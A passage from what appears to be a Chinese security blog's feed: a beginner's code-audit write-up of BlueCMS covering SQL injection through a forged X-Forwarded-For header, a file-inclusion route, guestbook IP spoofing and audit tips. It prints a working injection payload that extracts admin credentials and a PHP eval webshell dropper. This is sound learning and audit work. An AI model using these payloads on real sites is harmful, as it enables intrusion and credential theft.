class="line">showmsg(<span class="string">&#x27;该用户名已存在&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$user_name</span>&#x27;&quot;</span>))&#123;</span><br><span class="line">showmsg(<span class="string">&#x27;该用户名已存在&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201027185523507.png" alt="image-20201027185523507"></p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201027185539456.png" alt="image-20201027185539456"></p><h2 id="评论模块存在SQL注入"><a href="#评论模块存在SQL注入" class="headerlink" title="评论模块存在SQL注入"></a>评论模块存在SQL注入</h2><blockquote><p>定位：漏洞位置comment.php  漏洞页面：news.php?id=</p></blockquote><p>之前在上文也提到过，在对全局配置<code>include/common.inc.php</code>进行审计发现</p><p>配置文件中对<code>$_post $_get $_cookies $_request</code>输入统一进行gpc处理，但是遗漏了$_SERVER。而且网站恰恰通过该变量获取ip地址，因此我们可以对ip通过client-ip或x-forwarded-for等进行伪造。代码如下：</p><p>/include/comment.fun.php  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ip</span> = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>网站直接获取ip，并没有对IP格式进行校验，因此我们可以伪造ip。</p><p>这里是使用了Seay工具对整个项目进行扫描发现<code>/include/comment.fun.php </code>文件中的getip()可疑危险函数。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029133024736.png" alt="image-20201029133024736"></p><p>对getip()进行全文搜索查看调用，发现comment.php，进一步追踪。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029133215153.png" alt="image-20201029133215153"></p><p>comment.php为文章评论功能，跟踪其函数调用位置是一段插入SQL语句命令，代码如下：</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029133634151.png" alt="image-20201029133634151"></p><p>通过函数getip()获取$ip变量的值，直接插入到了SQL语句中并执行，可以看出应该存在SQL注入。注入点在文章进行评论的地方。</p><p>进入文章进行发布评论</p><blockquote><p>PS：因为bluscms本身代码没开发完整，在发表文章时出现点问题，解决方法见该漏动点最后的地方。</p></blockquote><p>分析SQL语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string">VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.getip().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p>一共有9个参数，因为insert语句可以一次插入多条数据，那么在构造$ip的内容时，可以通过闭合掉前面的部分，在拼接上后面的部分，使之变成完整的语句即可。通过测试发现其显示位是<code>$content</code>变量</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029134936204.png" alt="image-20201029134936204"></p><p>通过X-Forwarded-For构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1&#39;,&#39;1&#39;),(&#39;&#39;,&#39;1&#39;,&#39;0&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(admin_name,pwd)  from blue_admin),&#39;1603939754&#39;,&#39;9</span><br></pre></td></tr></table></figure><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029135041343.png" alt="image-20201029135041343"></p><p>通过查看评论，可以看到admin用户密码的hash值：（其值为admin）</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029135242069.png" alt="image-20201029135242069"></p><hr><p><strong>解决无法发表文章问题补充：</strong></p><p>因为需要制定文章分类，但代码并没提供相关分类功能，那么自己把那个分类逻辑注释了</p><p>打开文件<code>uploads/user.php</code> 定位到<code>act=add_news</code> ，将判断新闻分类的部分注释掉，这样就不会因为没有分类的问题，而导致程序的执行过程被中断。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029134523906.png" alt="image-20201029134523906"></p><h2 id="支付端口存在文件包含漏洞"><a href="#支付端口存在文件包含漏洞" class="headerlink" title="支付端口存在文件包含漏洞"></a>支付端口存在文件包含漏洞</h2><blockquote><p>定位：use.php?act=pay</p><p>Ps：该漏洞在真实环境中产生的可能性基本不大，虽然没影响，但我觉得还是应该提及一下</p></blockquote><p>分析源码，未对参数<code>$_POST[&#39;pay&#39;]</code>做安全检测，直接进行拼接。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (<span class="variable">$act</span> == <span class="string">&#x27;pay&#x27;</span>)&#123;</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;data/pay.cache.php&#x27;</span>;</span><br><span class="line"> <span class="variable">$price</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;price&#x27;</span>];</span><br><span class="line"> <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>])) &#123;</span><br><span class="line"> showmsg(<span class="string">&#x27;对不起，您没有选择支付方式&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">include</span> <span class="string">&#x27;include/payment/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;pay&#x27;</span>].<span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>有经验的人肯定会立马想到截断，然后就可以实现任意文件包含</p><p>但这里本身全局配置就对输入做了检测， 因此无法使用%00截断</p><blockquote><p>PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符串处理函数。在连接字符串时，0 字节 (\x00) 将作为字符串的结束符。</p></blockquote><p>然后我们还可以考虑使用路径长度截断，使用字符.或者/.或者./来截断</p><blockquote><p>操作系统对目录有最大长度的限制，linux最长4096，windows最长256，但长度超过最大限制时</p></blockquote><p>但它的要求是PHP 版本小于 5.2.8 ，现在基本没有比他小的PHP版本了吧。</p><hr><p>因为我用的是phpstudy，他也没有小于5.2.8版本的php版本，无法演示，就大致说一下思路吧:</p><p>利用<code>user.php</code>中的修改个人资料中的上传头像，上传一个图片马（内容为当执行该文件时会创建一个新文件并写入一句话木马）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs( fopen(<span class="string">&quot;test.php&quot;</span>,<span class="string">&quot;w&quot;</span>) , <span class="string">&#x27;&lt;?php eval($_POST[test]);?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ps：因为在act=pay 的地方 他是通过post传入参数，我们无法直接通过<code>pay</code>参数上传木马使用蚁剑连接，但可以利用跳板的思路，先利用include，执行图片马生出一个一句话木马后，再通过蚁剑连接上去。</p><p>具体测试案例可以参考文章：<a href="https://www.freebuf.com/news/196190.html">https://www.freebuf.com/news/196190.html</a></p><h2 id="留言栏IP可伪造"><a href="#留言栏IP可伪造" class="headerlink" title="留言栏IP可伪造"></a>留言栏IP可伪造</h2><blockquote><p>定位：guest_book.php</p></blockquote><p>这是一个提供了留言栏功能的页面，根据源码，构造参数，发送一条留言，显示如下：</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029145654895.png" alt="image-20201029145654895"></p><p>居然显示了IP地址，查看源码中的SQL语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql &#x3D; &quot;INSERT INTO &quot; . table(&#39;guest_book&#39;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">VALUES (&#39;&#39;, &#39;$rid&#39;, &#39;$user_id&#39;, &#39;$timestamp&#39;, &#39;$online_ip&#39;, &#39;$content&#39;)&quot;;</span><br></pre></td></tr></table></figure><p>但似乎并没有使用在评论模块中的getip()函数</p><p>但利用burp抓包添加XFF头测试后发现确实可以任意修改IP地址，但唯一存在问题的是他限制了IP字段的长度最大是15，猜测应该是在创建的表时对字段长度进行了设置。然后思路断了，无法利用，不知道有没有大佬有骚操作。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201029150513138.png" alt="image-20201029150513138"></p><h1 id="0x04-零散记录（杂）"><a href="#0x04-零散记录（杂）" class="headerlink" title="0x04 零散记录（杂）"></a>0x04 零散记录（杂）</h1><blockquote><p>在审计时发现的一些有趣的写法</p></blockquote><h2 id="1、安全配置-1"><a href="#1、安全配置-1" class="headerlink" title="1、安全配置-1"></a>1、安全配置-1</h2><p>在许多的配置文件(还不确定是不是只是配置文件或者..)的头部会写的写上这么一堆代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!defined(<span class="string">&#x27;IN_BLUE&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Access Denied!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：判断是否定义 <code>IN_BLUE</code>，未定义则当前运行文件直接结束</p><p>作用：防止不是从入口文件进入，文件被任意读取和使用，于是项目在对需要调用这些配置文件的代码头上都写上了一句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&quot;IN_BLUE&quot;</span>,<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h2 id="2、安全配置-2"><a href="#2、安全配置-2" class="headerlink" title="2、安全配置-2"></a>2、安全配置-2</h2><p>初看该文件 有获取参数，有sql查询，而且参数也是直接拼接，认为存在sql注入</p><p>但仔细查看却并不存在sql注入。</p><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201026163912565.png" alt="image-20201026163912565"></p><p>对获取的参数都经过了intval()函数处理（只取整数部分的值），这是一种非常有效且直接的过滤方式，使用的是白名单。使该文件安全，这个框架的很多获取参数的地方使用的都是<code>intval</code></p><h2 id="3、开发思路-1"><a href="#3、开发思路-1" class="headerlink" title="3、开发思路-1"></a>3、开发思路-1</h2><p>在我们显示页面(这里参考user.php中的uc_user_login)所有的函数写法都是</p><img src="BlueCMS/image-20201020195144897.png" alt="image-20201020195144897"  /><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function uc_user_login($username, $password)</span><br><span class="line">call_user_func(UC_API_FUNC, &#39;user&#39;, &#39;login&#39;)</span><br></pre></td></tr></table></figure><p>自定义函数uc_user_login()，使用call_user_func回调函数</p><p>而UC_API_FUNC根据后面的参数调用的是不同的API接口</p><p>这里是调用uc_client/control/use.php 的onlogin()函数</p><p>PS：可能我的理解还是有问题，大家可以查阅一些资料进一步了解 关键词：<strong>ucenter通信、登录原理</strong> 、UCAPI</p><h2 id="4、小方法"><a href="#4、小方法" class="headerlink" title="4、小方法"></a>4、小方法</h2><ul><li><p>快速查询  <code>.$</code> 看看有没有直接进行拼接的字符串变量，引起SQL注</p><p>例如：ad_js.php中的SQL注入</p></li></ul><p><img src="https://www.kro1lsec.com:442/images/2021/05/26/image-20201028211254945.png" alt="image-20201028211254945"></p><ul><li><p>先按照文件目录访问一遍所有的文件，查看其页面显示，简单过一遍代码，尝试可以使用的参数</p></li><li><p>使用代码审计工具(例如Seay)进行辅助，直接定位可疑函数</p></li></ul><h1 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h1><h2 id="代码审计方式"><a href="#代码审计方式" class="headerlink" title="代码审计方式"></a>代码审计方式</h2><ul><li>追踪危险函数(查询关键字)</li><li>追踪数据流</li><li>按功能进行审计</li><li>通读全文</li></ul><p><strong>我的审计思路：</strong></p><p>最开始先分析一下全局配置文件：</p><p>1、对关键字$_GET，$_POST的搜索，是否进行了全局过滤字符</p><p>2、查看主页index包含的配置文件</p><p>然后进行一个个文件进行审计，但我只查看数据流信息（获取get和post参数的代码）</p><p>因为我发现当自己直接从整个项目框架入手时会变得不知所措，不知道到底该看什么，不该看什么，不如把目标放近，从一个个文件出发，只关注何处进行了获取参数。</p><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>最开始我确实是想一行行进行审计，但我开始真正的代码审计时，发现一行行的读过去是方法根本不可能的，费时又费力，我们进行代码审计的目标就是要学会如何能快速定位目标，并且发现目标问题（这个水平真的太强了，跟学长一起打CTF，虽然他是个Pwn选手，但帮忙看web源码分析时总能非常快速的定位问题，并且他提出的永远是这个地方肯定是这样的，而不是这里可能是这样的）。</p><p><strong>代码审计流程学习建议</strong></p><p>bwapp、dvwa(漏洞靶场)-&gt;blueCMS-&gt;小众CMS-&gt;dede、wordpress-&gt;框架</p><p><strong>我现在先尝试的做法：</strong><br>我是跳过了DVWA的审计，先尝试对一个小众CMS入手(blueCMS)，先通读全文，了解了基本功能和结构后，开始正式的代码审计，根据追踪数据流进行代码审计，在审计中会碰到一些常见的功能(例如文件上传，SQL注入)，这时候我可能会回去看看DVWA上的对于的web漏洞的源码是怎么写的(因为他既有危险的写法也有完全无危险的写法)。在对数据流都审计完后再看看剩下的一些还没审计的代码</p><p>审计搭配的做法：根据漏洞靶场的源码了解某一漏洞的形成，根据我要审计的cms再看看其他网上的审计文章教程</p><blockquote><p>适合自己的方法才是最好的方法</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第一次的代码审计–BlueCMS代码审计&quot;&gt;&lt;a href=&quot;#第一次的代码审计–BlueCMS代码审计&quot; class=&quot;headerlink&quot; title=&quot;第一次的代码审计–BlueCMS代码审计&quot;&gt;&lt;/a&gt;第一次的代码审计–BlueCMS代码审计&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
